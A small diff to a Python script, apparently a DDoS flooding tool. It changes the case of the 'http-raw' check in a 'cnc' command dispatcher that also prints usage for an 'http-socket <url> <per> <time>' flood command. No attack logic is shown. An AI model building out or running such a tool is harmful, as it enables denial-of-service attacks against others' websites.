@@ -519,7 +519,7 @@ def main():
                 print('Usage: http-socket <url> <per> <time>')
                 print('Example: http-socket http://example.com 5000 60')
 
-        elif "http-raw" in cnc:
+        elif "HTTP-RAW" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
